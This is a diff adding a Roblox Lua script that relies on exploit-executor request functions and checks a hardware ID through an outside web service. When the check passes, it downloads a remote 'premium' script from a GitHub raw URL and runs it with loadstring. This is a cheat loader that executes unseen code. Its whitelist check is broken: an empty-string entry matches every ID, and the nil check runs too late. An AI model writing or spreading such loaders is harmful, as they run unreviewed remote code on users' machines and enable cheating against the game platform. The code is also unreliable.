@@ -1,0 +1,31 @@
+local approved_hwids = {
+  "",
+  "HWID2",
+}
+
+local request = http_request or request or HttpPost or syn.request
+
+local plr = game:GetService("Players").LocalPlayer
+
+-- Function to check if the current HWID is approved
+local function is_hwid_approved()
+  -- Get the current HWID using a system command
+  local hwid = request({Url = "https://hwid-executor.vercel.app/api/hwid?one=true"}).Body
+  if hwid:lower():find("failed to detect") then return plr:Kick() end
+  if not hwid then return plr:Kick() end
+
+  -- Check if the current HWID is in the list of approved HWIDs
+  for i = 1, #approved_hwids do
+    if hwid:find(approved_hwids[i]) then
+      return true
+    end
+  end
+
+  -- If the current HWID is not in the list of approved HWIDs, return false
+  return false
+end
+
+-- Check if the current HWID is approved
+if is_hwid_approved() then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/toosiwhip/premium/main/hwid%20apraghost%20script.lua"))()
+end
